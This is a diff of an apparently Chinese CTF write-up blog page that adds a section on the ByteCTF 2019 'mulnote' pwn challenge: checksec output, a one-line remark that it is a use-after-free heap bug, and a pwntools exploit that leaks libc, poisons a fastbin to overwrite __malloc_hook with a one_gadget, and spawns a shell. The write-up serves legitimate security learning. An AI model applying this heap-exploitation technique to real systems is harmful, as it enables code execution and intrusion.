@@ -388,14 +388,14 @@ __int64 __fastcall read_in(__int64 ptr, signed int size, ">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.6k
+                        1.7k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        8 分
+                        9 分
                     </div>
                     
                 
@@ -652,6 +652,35 @@ ok:
 return ERRNO(0)
 allow:
 return ALLOW
+</code></pre>
+<h2 id="Mulnote"><a href="#Mulnote" class="headerlink" title="Mulnote"></a>Mulnote</h2><pre><code>[*] &#39;/home/sh/practice/ctf-writeups/byte_ctf_2019/pwn/mulnote/mulnote&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  &#39;/glibc/x64/2.23/lib/&#39;
+</code></pre><p>这个题目逆向有点难，基本靠动态调试猜，差不多就是个UAF的弱鸡堆题（猜不出来就不这么说了，哈哈哈）。</p>
+<pre class=" language-python"><code class="language-python">malloc<span class="token punctuation">(</span><span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+Show<span class="token punctuation">(</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'note[0]:\n'</span><span class="token punctuation">)</span>
+result <span class="token operator">=</span> r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+main_arena_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>result<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">88</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main_arena_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>main_arena_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc_addr <span class="token operator">=</span> main_arena_addr <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>main_arena_addr <span class="token operator">-</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\0'</span><span class="token punctuation">)</span>
+malloc<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'z'</span> <span class="token operator">*</span> <span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_addr <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'C\0'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 
             </div>
@@ -974,7 +1003,7 @@ https://xz.aliyun.com/t/6731#toc-8http://blog.eonew.cn/archives/993 setcontext �
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">45.7k</span>
+                <span class="white-color">46.8k</span>
             
 
             
